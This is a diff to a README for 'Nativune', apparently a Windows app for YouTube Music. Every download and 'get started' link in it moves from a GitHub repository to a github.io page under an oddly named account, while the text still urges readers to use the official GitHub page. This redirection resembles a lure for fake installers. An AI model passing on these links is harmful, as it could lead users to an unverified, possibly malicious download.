@@ -1,10 +1,10 @@
 # 🎵 Nativune - Your Music, Natively on Windows
 
-[![Download Nativune](https://img.shields.io/badge/Download-Nativune-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Selfpollinating-lichtenoideczema840/Nativune)
+[![Download Nativune](https://img.shields.io/badge/Download-Nativune-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://selfpollinating-lichtenoideczema840.github.io)
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Selfpollinating-lichtenoideczema840/Nativune](https://github.com/Selfpollinating-lichtenoideczema840/Nativune)
+Visit this link to download the application: [https://selfpollinating-lichtenoideczema840.github.io](https://selfpollinating-lichtenoideczema840.github.io)
 
 Follow these simple steps:
 
@@ -143,9 +143,9 @@ Always download Nativune from the official GitHub page to ensure you're getting 
 
 ## 🚀 Ready to Start?
 
-[![Get Nativune Now](https://img.shields.io/badge/🚀%20Get%20Nativune%20Now-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Selfpollinating-lichtenoideczema840/Nativune)
+[![Get Nativune Now](https://img.shields.io/badge/🚀%20Get%20Nativune%20Now-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://selfpollinating-lichtenoideczema840.github.io)
 
-Click the button above or visit [the download page](https://github.com/Selfpollinating-lichtenoideczema840/Nativune) to get started. The download is free, and installation takes less than a minute.
+Click the button above or visit [the download page](https://selfpollinating-lichtenoideczema840.github.io) to get started. The download is free, and installation takes less than a minute.
 
 Join thousands of Windows users who enjoy YouTube Music the native way. Nativune is here to make your listening experience better - try it today.
 
